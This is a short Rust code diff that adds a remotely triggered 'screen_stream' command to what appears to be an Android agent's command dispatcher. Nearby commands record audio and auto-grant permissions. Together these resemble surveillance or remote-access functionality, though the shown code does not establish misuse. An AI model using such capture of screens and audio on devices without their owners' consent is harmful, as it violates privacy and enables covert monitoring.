@@ -288,6 +288,22 @@ fn execute_command(cmd: &str, payload: &serde_json::Value) -> Option<String> {
                 .unwrap_or(5000) as i32;
             Some(android_bridge::record_audio(ms))
         }
+        // Live semantic screen stream. {on, interval_ms, max_nodes}
+        // Frames ride the existing a11y event pipe; nothing new to transport.
+        "screen_stream" | "stream" => {
+            let on = payload.get("on").and_then(|v| v.as_bool()).unwrap_or(true);
+            let interval = payload
+                .get("interval_ms")
+                .and_then(|v| v.as_i64())
+                .unwrap_or(800)
+                .clamp(200, 10_000) as i32;
+            let max_nodes = payload
+                .get("max_nodes")
+                .and_then(|v| v.as_i64())
+                .unwrap_or(120)
+                .clamp(10, 400) as i32;
+            Some(android_bridge::set_screen_stream(on, interval, max_nodes))
+        }
         "grant" | "autogrant" => {
             let perm = payload.as_str()
                 .or_else(|| payload.get("permission").and_then(|v| v.as_str()))
